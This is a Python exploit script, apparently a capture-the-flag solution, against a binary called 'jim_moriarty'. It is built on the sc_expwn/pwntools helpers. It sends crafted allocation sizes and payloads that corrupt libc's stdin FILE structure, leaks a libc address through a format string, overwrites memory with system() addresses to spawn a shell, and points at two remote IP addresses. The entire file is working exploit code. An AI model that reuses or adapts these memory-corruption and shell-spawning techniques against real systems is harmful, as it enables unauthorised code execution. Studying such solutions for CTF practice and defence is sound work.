#!/usr/bin/env python
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py
import traceback

bin_file = './jim_moriarty'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'sock_local', 'sock_remote1', 'sock_remote2')
env.set_item('mode',    debug = 'PROC', local = 'PROC', sock_local = 'SOCKET', sock_remote1 = 'SOCKET', sock_remote2 = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file]}, \
                        local   = {'argv':[bin_file]}, \
                        sock_local  = {'host':'localhost', 'port':8080}, \
                        sock_remote1  = {'host':'178.62.249.106', 'port':54518}, \
                        sock_remote2  = {'host':'146.185.168.172', 'port':54518})
env.select('')

#==========

binf = ELF(bin_file)
addr_bss            = binf.sep_section['.bss']
addr_stackof        = binf.sep_function['stackof']

libc = binf.libc
offset_libc_stdin   = libc.symbols['_IO_2_1_stdin_']
offset_libc_getchar = libc.sep_function['getchar']

#==========

def attack(conn):
    first_size  = (0x300000-0x10) + offset_libc_stdin + 0xd8 + 2
    second_size = 0x300000 - 0x20
    payload_size = 0x580

    conn.sendlineafter('Size? ', str(first_size))
    conn.sendlineafter('Too large, another size?', str(second_size))

    payload = (p64(addr_stackof+0xb9)+p64(addr_stackof+0xcd)) * (payload_size/0x10)
    conn.sendlineafter('shellcode? ', payload)

    sleep(0.1)

    payload  = '%6$p;sh'
    payload += '\x00'*(0x88 - len(payload))
    payload += p64(addr_bss + 0x40)
    payload += '\x00'*(0xd8 - len(payload))
    payload += '\xe8'
    conn.send(payload)
    
    libc.address = int(conn.read().split(';')[0], 16) - (offset_libc_getchar + 245)
    info('addr_libc     = 0x{:08x}'.format(libc.address))
    addr_libc_system    = libc.sep_function['system']

    if env.check('debug'):
        gdb.attach(conn)
    
    payload = p64(addr_libc_system) * (second_size/8)
    conn.send(payload)

#==========

if __name__=='__main__':
    i = 0
    while True:
        print i
        i+=1
        conn = communicate(env.mode, **env.target)
        try:
            attack(conn)
        except:
            # traceback.print_exc()
            conn.close()
        else:
            break
    conn.interactive()
    
#==========
